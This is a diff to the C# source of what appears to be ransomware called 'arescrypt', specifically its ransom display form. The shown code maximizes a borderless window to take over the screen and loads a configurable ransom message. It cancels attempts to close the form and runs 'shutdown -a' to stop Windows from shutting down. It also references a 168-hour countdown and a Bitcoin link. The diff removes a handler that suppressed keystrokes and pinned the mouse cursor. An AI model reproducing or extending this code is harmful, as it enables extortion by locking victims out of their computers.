@@ -15,15 +15,15 @@ namespace arescrypt
         public Display() {
             InitializeComponent();
 
-            if (!Program.sandBox) // == false
+            if (!Configuration.sandBox) // == false
             {   // This will maximize the screen, and eliminate the taskbar. 
                 this.WindowState = FormWindowState.Maximized;
                 this.FormBorderStyle = FormBorderStyle.None;
             }
+
+            this.displayMessage.Text = Configuration.customDisplayMessage;
         }
-
-        private void Display_Load(object sender, EventArgs e) { }
-
+        
         Point cursorPos = new Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
 
         // 168:00:00
@@ -95,14 +95,6 @@ namespace arescrypt
             e.Cancel = true;
             if (e.CloseReason == CloseReason.WindowsShutDown)
                 Process.Start("shutdown", "-a");
-        }
-
-        private void keyPressAction(object sender, KeyEventArgs e)
-        {
-            e.SuppressKeyPress = true;
-            System.Threading.Thread.Sleep(666);
-            Cursor.Position = cursorPos;
-            mouse_event(0x002 | 0x004);
         }
 
         private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
